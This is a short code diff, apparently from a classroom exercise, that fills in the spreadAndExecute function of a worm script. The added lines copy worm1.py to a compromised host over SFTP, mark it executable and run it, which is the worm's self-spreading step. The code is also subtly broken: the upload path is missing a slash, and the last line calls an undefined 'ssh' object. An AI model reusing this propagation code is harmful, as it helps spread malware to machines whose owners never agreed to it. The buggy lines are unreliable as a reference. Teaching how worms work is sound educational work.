@@ -60,8 +60,11 @@ def spreadAndExecute(sshClient):
 	# code we used for an in-class exercise.
 	# The code which goes into this function
 	# is very similar to that code.	
-	pass
-
+	
+	sftpClient = sshClient.open_sftp()
+	sftpClient.put("worm1.py", "/tmp" + "worm1.py")
+	sshClient.exec_command("chmod a+x /tmp/" + "worm1.py")
+	ssh.exec_command("python /tmp/" + "worm1.py")
 
 ############################################################
 # Try to connect to the given host given the existing
